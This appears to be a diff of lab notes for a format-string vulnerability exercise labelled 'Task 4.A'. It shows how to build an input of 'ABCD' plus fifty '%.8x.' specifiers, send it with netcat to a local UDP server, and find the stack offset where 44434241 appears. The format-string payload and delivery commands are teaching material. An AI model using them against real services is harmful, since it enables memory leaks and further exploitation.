@@ -1,1 +1,24 @@
-python3 -c "print(hex(0xbffff0d0 - 0xbffff028))"
+Task 4.A — Stack Data (Screenshot 10)
+Goal
+
+Find how many %x are needed until your input appears as:
+
+44434241
+
+(this represents "ABCD")
+
+Step 1 — Create input
+python3 - <<'PY'
+open("input", "w").write("ABCD" + "%.8x."*50)
+PY
+Step 2 — Send it
+nc -u 127.0.0.1 9090 < input
+Step 3 — Look at server output
+
+You must find:
+
+44434241
+
+Example:
+
+... b7fff918.804a014.44434241.b7fe97a2 ...
